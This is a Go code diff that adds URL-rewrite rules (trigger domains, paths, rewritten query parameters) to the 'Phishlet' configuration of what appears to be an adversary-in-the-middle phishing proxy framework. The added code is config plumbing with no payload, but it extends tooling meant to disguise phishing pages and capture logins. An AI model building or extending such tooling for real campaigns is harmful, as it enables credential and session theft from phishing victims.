@@ -105,6 +105,27 @@ type Intercept struct {
 	mime        string         `mapstructure:"mime"`
 }
 
+// --- Begin: URL Rewrite Support ---
+
+type RewriteQuery struct {
+	Key   string `mapstructure:"key" yaml:"key"`
+	Value string `mapstructure:"value" yaml:"value"`
+}
+
+type RewriteRule struct {
+	Trigger struct {
+		Domains []string `mapstructure:"domains" yaml:"domains"`
+		Paths   []string `mapstructure:"paths" yaml:"paths"`
+	} `mapstructure:"trigger" yaml:"trigger"`
+	Rewrite struct {
+		Path  string         `mapstructure:"path" yaml:"path"`
+		Query []RewriteQuery `mapstructure:"query" yaml:"query"`
+	} `mapstructure:"rewrite" yaml:"rewrite"`
+	WhitelistParams []string `mapstructure:"whitelist_params" yaml:"whitelist_params"`
+}
+
+// --- End: URL Rewrite Support ---
+
 type Phishlet struct {
 	Name             string
 	ParentName       string
@@ -128,9 +149,14 @@ type Phishlet struct {
 	forcePost        []ForcePost
 	login            LoginUrl
 	js_inject        []JsInject
+
 	intercept        []Intercept
 	customParams     map[string]string
 	isTemplate       bool
+
+	// --- Begin: URL Rewrite Support ---
+	RewriteUrls []RewriteRule
+	// --- End: URL Rewrite Support ---
 }
 
 type ConfigParam struct {
@@ -218,6 +244,7 @@ type ConfigIntercept struct {
 	Mime       *string `mapstructure:"mime"`
 }
 
+// --- Begin: URL Rewrite Support ---
 type ConfigPhishlet struct {
 	Name        string             `mapstructure:"name"`
 	RedirectUrl string             `mapstructure:"redirect_url"`
@@ -232,7 +259,9 @@ type ConfigPhishlet struct {
 	LoginItem   *ConfigLogin       `mapstructure:"login"`
 	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
 	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
+	RewriteUrls *[]RewriteRule     `mapstructure:"rewrite_urls" yaml:"rewrite_urls"`
 }
+// --- End: URL Rewrite Support ---
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
 	p := &Phishlet{
@@ -266,6 +295,9 @@ func (p *Phishlet) Clear() {
 	p.forcePost = []ForcePost{}
 	p.customParams = make(map[string]string)
 	p.isTemplate = false
+	// --- Begin: URL Rewrite Support ---
+	p.RewriteUrls = nil
+	// --- End: URL Rewrite Support ---
 }
 
 func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[string]string) error {
@@ -315,6 +347,12 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		return err
 	}
 
+	// --- Begin: URL Rewrite Support ---
+	if fp.RewriteUrls != nil {
+		p.RewriteUrls = *fp.RewriteUrls
+	}
+	// --- End: URL Rewrite Support ---
+
 	if fp.Params != nil {
 		if len(*fp.Params) > 0 {
 			p.isTemplate = true
@@ -363,15 +401,6 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				p.customParams[param.Name] = val
 			}
 		}
-
-		/*
-			if customParams != nil {
-				p.customParams = *customParams
-			} else {
-				for _, param := range *fp.Params {
-					p.customParams[param.Name] = param.Default
-				}
-			}*/
 	}
 
 	if fp.ProxyHosts == nil {
